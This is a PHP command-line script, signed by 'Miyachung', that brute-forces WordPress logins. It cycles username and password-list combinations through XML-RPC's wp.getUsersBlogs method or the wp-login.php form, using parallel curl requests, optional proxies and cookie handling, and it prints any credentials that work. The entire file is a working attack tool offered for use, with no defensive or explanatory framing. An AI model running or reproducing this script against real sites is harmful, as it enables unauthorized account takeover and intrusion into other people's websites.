<?php
/*
===================================================================
        .__                      .__                          
  _____ |__|___.__._____    ____ |  |__  __ __  ____    ____  
 /     \|  <   |  |\__  \ _/ ___\|  |  \|  |  \/    \  / ___\ 
|  Y Y  \  |\___  | / __ \\  \___|   Y  \  |  /   |  \/ /_/  >
|__|_|  /__|/ ____|(____  /\___  >___|  /____/|___|  /\___  / 
      \/    \/          \/     \/     \/           \//_____/ 
===================================================================	  
. Wordpress Brute Force
. Written by Miyachung

    Methods;
    1) XML-RPC
    2) Wordpress Login (wp-login.php)

    Usage : -h HOST -u USERNAME(S) [CAN SEPARATED WITH ','] -p PASSWORDS [MUST BE FILE] -t THREADS [OPTIONAL,DEFAULT IS 10]

*/
error_reporting(E_ALL ^ E_NOTICE);

print "[INFO][~] Hello! Miyachung greets you :)".PHP_EOL;
print "[INFO][~] Running in 1,3 seconds..".PHP_EOL;
sleep(rand(1,3));

$options = getopt('h:u:p:t:');

if(!isset($options['h']) || !isset($options['u']) || !isset($options['p'])){
    print "Usage -> {$_SERVER['PHP_SELF']} -h HOST -u USERNAME(S) [CAN SEPARATED WITH ','] -p PASSWORDS [MUST BE FILE] -t THREADS [OPTIONAL,DEFAULT IS 10]".PHP_EOL;
    exit;
}


if(strstr($options['u'],',')){
    $username       = explode(",",$options['u']);
    $username       = array_filter($username);
    $username_count = count($username);
}else{
    $username = $options['u'];
}

if(is_file($options['p'])){
    $passwords       = array_map('trim',file($options['p']));
    $passwords_count = count($passwords);
}else{
    die("Password file is not found or a directory!");
}
$host       = str_replace("http://","",$options['h']);
$host       = str_replace("https://","",$host);
$host_IP    = gethostbyname($host) or die("Host seems down :(");
$host_http  = "http://".$host;

echo "[ + ] Host: ".$host." [$host_IP]".PHP_EOL;
if(is_array($username)){
echo "[ + ] Usernames loaded [$username_count]".PHP_EOL;
}else{
echo "[ + ] Username [$username]".PHP_EOL;
}
echo "[ + ] Passwords loaded from file {$options['p']} [$passwords_count]".PHP_EOL;

if(isset($options['t'])){
    if(is_numeric($options['t'])){
        $threads = $options['t'];
    }else{
        die("Threads must be an integer value!");
    }
}else{
    $threads = 10;
}

echo "[ + ] Number of $threads threads going to work until brute forcing..".PHP_EOL;

echo "\t1) XMLRPC".PHP_EOL;
echo "\t2) Wordpress Login (wp-login.php)".PHP_EOL;
echo "\t[INFO] Which method would you like to use (1/2)? ";

$option = fgets(STDIN);
$option = str_replace("\r\n","",$option);
$option = trim($option);

if(!is_numeric($option)) die("The answer must be 1 or 2!");

if($option == 1){
    $check_xmlrpc = @file_get_contents($host_http.'/xmlrpc.php');
    if(!preg_match('/XML-RPC server accepts POST requests only./i',$check_xmlrpc)){
        die("\tSeems host doesn't have XML-RPC service installed :(".PHP_EOL);
    }
}else{
    $check_wplogin = @file_get_contents($host_http.'/wp-login.php');
    if(!strstr($check_wplogin,'type="text" name="log"') && !strstr($check_wplogin,'type="password" name="pwd"')){
        die("\tSeems host doesn't have wp-login.php :(".PHP_EOL);
    }
}

echo "\t[INFO] Would you like to set a proxy ? (y/N)? ";

$proxy_ask = fgets(STDIN);
$proxy_ask = str_replace("\r\n","",$proxy_ask);
$proxy_ask = trim($proxy_ask);

if(!empty($proxy_ask)){
    if($proxy_ask == "y"){
        echo "\t[INFO] Please enter proxy adress: ";
        $proxy = fgets(STDIN);
        $proxy = str_replace("\r\n","",$proxy);
        $proxy = trim($proxy);
    }
}

if($proxy){
    echo "\t[INFO] You choose to use a proxy [$proxy]".PHP_EOL;
    echo "\t[INFO] Checking proxy if it is valid or not..".PHP_EOL;
    if($option == 1){
        $curlx = curl_init();
        curl_setopt_array($curlx,[CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => $host_http.'/xmlrpc.php',CURLOPT_PROXY => $proxy,CURLOPT_TIMEOUT => 10]);
        $data = curl_exec($curlx);
        curl_close($curlx);
        if(!preg_match('/XML-RPC server accepts POST requests only./i',$data)){
            die("\t[INFO][-] Seems proxy that you've entered is not working :(".PHP_EOL);
        }
    }else{
        $curlx = curl_init();
        curl_setopt_array($curlx,[CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => $host_http.'/wp-login.php',CURLOPT_PROXY => $proxy,CURLOPT_TIMEOUT => 10]);
        $data = curl_exec($curlx);
        curl_close($curlx);
        if(!strstr($data,'type="text" name="log"') && !strstr($data,'type="password" name="pwd"')){
            die("\t[INFO][-] Seems proxy that you've entered is not working :(".PHP_EOL);
        }
    }

    echo "\t[INFO][+] Proxy is OK,continue..".PHP_EOL;
    sleep(1);
}


if(is_array($username)){

    foreach($username as $user){
        foreach($passwords as $pwd){
            if($option == 1){
                $postfield[] = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'.urlencode($user).'</value></param><param><value>'.urlencode($pwd).'</value></param></params></methodCall>';
            }else{
                // $postfield[] = 'log='.$user.'&pwd='.$pwd.'&wp-submit=Log+In&redirect_to='.$host_http.'/wp-admin/&testcookie=1';
                $postfield[] = http_build_query(['log' => $user,'pwd' => $pwd,'wp-submit' => 'Log In','redirect_to' => $host_http.'/wp-admin/','testcookie' => 1]);
            }
        }
    }
    
}else{
    foreach($passwords as $pwd){
        if($option == 1){
            $postfield[] = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'.urlencode($username).'</value></param><param><value>'.urlencode($pwd).'</value></param></params></methodCall>';
        }else{
            // $postfield[] = 'log='.$username.'&pwd='.$pwd.'&wp-submit=Log+In&redirect_to='.$host_http.'/wp-admin/&testcookie=1';
            $postfield[] = http_build_query(['log' => $username,'pwd' => $pwd,'wp-submit' => 'Log In','redirect_to' => $host_http.'/wp-admin/','testcookie' => 1]);
        }
    }
}
echo PHP_EOL;
$postfield_count = count($postfield);
echo "\t[INFO] ".$postfield_count." post requests will be performed to the host";
echo PHP_EOL.PHP_EOL;
sleep(rand(1,3));


$chunk_posts = array_chunk($postfield, $threads);
$multi       = curl_multi_init();
$counter     = 0;
$start_time  = time(); 
@unlink("cookies.txt");
foreach($chunk_posts as $post){
    $curl = [];
    foreach($post as $i => $pfield){
        $curl['handler'][$i] = curl_init();
        $curl['content'][$i] = $pfield;
        curl_setopt_array($curl['handler'][$i],[
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => $pfield,
            CURLOPT_USERAGENT => 'Mozilla 5.0'
            ]);
        if($proxy){
            curl_setopt($curl['handler'][$i],CURLOPT_PROXY,$proxy);
        }
        if($option == 1){
            curl_setopt($curl['handler'][$i],CURLOPT_URL,$host_http.'/xmlrpc.php');
        }else{
            if(!file_exists("cookies.txt")){
                print "\tTaking cookies from wp-login.php..".PHP_EOL;
                $ch = curl_init();
                curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => $host_http.'/wp-login.php',CURLOPT_COOKIEJAR => 'cookies.txt']);
                curl_exec($ch);
                curl_close($ch);
            }
            curl_setopt($curl['handler'][$i],CURLOPT_URL,$host_http.'/wp-login.php');
            curl_setopt($curl['handler'][$i],CURLOPT_FOLLOWLOCATION,1);
            curl_setopt($curl['handler'][$i],CURLOPT_COOKIEFILE,'cookies.txt');
        }
        curl_multi_add_handle($multi,$curl['handler'][$i]);
    }

    do{

        while(($run = curl_multi_exec($multi,$active)) === CURLM_CALL_MULTI_PERFORM);
        if($run != CURLM_OK) break;
        curl_multi_select($multi,15);


        while($read = curl_multi_info_read($multi)){
            ++$counter;
            if($read['result'] === 0){
                $content = curl_multi_getcontent($read['handle']);
                $key     = array_search($read['handle'],$curl['handler']);
                if($option == 1){
                    if(stristr($content,"isAdmin") && stristr($content,"blogid")){

                        print PHP_EOL.PHP_EOL;
                        print "\t[REQUEST $counter / $postfield_count]".PHP_EOL;
                        print "\t[INFO] Host: ".$host_http.PHP_EOL;
                        print "\t[+++++++] LOGIN FOUND , CHECK BELOW!".PHP_EOL;
                        print "\t".$curl['content'][$key];
                        exit;
    
                    }elseif(strstr($content,"faultString")){
                        preg_match('@<string>(.*?)</string>@',$content,$string);
                        preg_match('@<int>(.*?)</int>@',$content,$int);
    
                        print "\t[REQUEST $counter / $postfield_count][CODE:$int[1]] $string[1]".PHP_EOL;
                        
                    }else{
                        print "\t[REQUEST $counter / $postfield_count][CODE:UNKNOWN] UNKNOWN ERROR!".PHP_EOL;
                        print $content;
                    }
                }else{
                    if(strstr($content,'theme-editor.php') && strstr($content,'logout')){
                        print PHP_EOL.PHP_EOL;
                        print "\t[REQUEST $counter / $postfield_count]".PHP_EOL;
                        print "\t[+++++++] LOGIN FOUND , CHECK BELOW!".PHP_EOL;
                        print "\t".$curl['content'][$key];
                        exit;
                    }elseif(strstr($content,'<div id="login_error">')){
                        preg_match('@<div id="login_error">(.*?)</div>@s',$content,$login_error);

                        print "\t[REQUEST $counter / $postfield_count][LOGIN ERROR] ".strip_tags(trim($login_error[1])).PHP_EOL;
                    }else{
                        print "\t[REQUEST $counter / $postfield_count] UNKNOWN ERROR!".PHP_EOL;
                        print $content;
                    }
                }
    
            curl_multi_remove_handle($multi,$read['handle']);
        }
    }

    }while($active > 0);

}
curl_multi_close($multi);
print PHP_EOL;
print "\t[ - ] No valid username & password combinations".PHP_EOL;
print "\t[INFO] Elapsed time: ".(time()-$start_time)." seconds".PHP_EOL;
print "\t[INFO] Good bye :)) codes by miyachung".PHP_EOL;
